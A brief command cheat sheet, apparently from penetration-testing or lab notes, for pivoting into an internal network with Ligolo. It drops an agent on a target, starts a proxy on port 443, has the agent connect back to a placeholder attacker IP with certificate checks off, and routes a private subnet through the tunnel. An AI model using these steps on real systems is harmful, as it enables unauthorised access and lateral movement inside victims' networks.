drop ligolo-agent.exe (and wintun.dll?) on target

sudo ip tuntap add user [your_username] mode tun ligolo

sudo ip link set ligolo up

sudo ligolo-proxy -selfcert -laddr 0.0.0.0:443

// on target
./ligolo-agent.exe -connect <attacker IP here>:443 -ignore-cert

session -> choose session

//add route to destination
sudo ip route add 192.168.110.0/24 dev ligolo

tunnel_start